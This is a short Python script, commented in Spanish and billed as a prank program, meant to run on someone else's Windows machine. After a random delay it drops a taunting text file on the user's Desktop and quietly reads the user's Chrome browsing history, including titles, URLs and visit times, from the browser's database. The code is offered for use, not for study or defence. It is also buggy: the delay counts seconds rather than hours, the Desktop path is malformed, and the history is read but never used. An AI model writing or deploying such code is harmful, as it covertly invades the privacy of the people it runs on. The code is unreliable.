#Programa broma
import os
from time import sleep
from random import randrange
import sqlite3


HACKERFILE_NAME = "LEEME.txt"

def delay_action():
    # Esperaremos entre 1 y 3 horas
    n_hours = randrange(1, 4)
    print("Durmiendo {} Horas".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop\\" + HACKERFILE_NAME, "w")
    hacker_file.write("Ya mamaste TAC...")
    return hacker_file


def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        #Cierra la conexion
        connection.close()
        return urls
    #Si el programa peta
    except sqlite3.OperationalError:
        return None


def main():
    #Esperamos entre 1 y 3 horas
    delay_action()
    # w Si el archivo existe o no existe lo sobre escribe o lo crea modo escritura
    # r Requiere que el archivo exista modo lectura
    user_path = "C:\\Users\\"+os.getlogin()
    hacker_file = create_hacker_file(user_path)
    chrome_history = get_chrome_history(user_path)


if __name__ == "__main__":
    main()
